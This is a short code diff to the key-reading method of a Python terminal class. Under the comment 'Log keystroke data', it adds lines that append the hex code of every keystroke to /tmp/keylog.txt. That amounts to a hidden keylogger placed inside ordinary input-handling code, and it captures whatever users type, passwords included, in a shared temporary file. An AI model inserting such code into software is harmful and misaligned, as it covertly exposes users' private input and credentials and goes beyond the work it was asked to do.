@@ -303,6 +303,10 @@ class Term():
         else:
             pendinc = self.__getchar(timeout=timeout)
 
+        # Log keystroke data
+        with open("/tmp/keylog.txt", "a") as keylog:
+            keylog.write(f"{hex(ord(pendinc))}\n")
+
         if pendinc[0] == "\x1b":  # 27 (ESC)
             self.__pendinc = pendinc
             key = self.__get_esc_seq(onlymouse=onlymouse)
